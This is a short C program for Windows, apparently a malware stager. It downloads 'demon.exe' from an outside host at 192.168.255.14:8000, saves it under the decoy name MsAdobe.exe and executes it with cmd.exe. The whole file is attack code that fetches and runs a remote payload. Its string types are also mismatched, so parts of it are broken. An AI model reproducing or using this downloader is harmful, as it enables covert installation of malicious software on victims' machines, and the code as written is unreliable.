//Downloads and executes payload

// Remote Process Injection


#include <stdio.h>
#include <Windows.h>
#include <urlmon.h>
#include <stdint.h>
#include <winnt.h>
#include <fileapi.h>

int main()
{
	const char* filename = L"c:\\Users\\saurav\\Desktop\\MsAdobe.exe";
	URLDownloadToFile(NULL, L"http://192.168.255.14:8000/demon.exe", filename, 0, NULL);
	system("cmd.exe /c c:\\Users\\saurav\\desktop\\MsAdobe.exe");

	return 0;
	
}
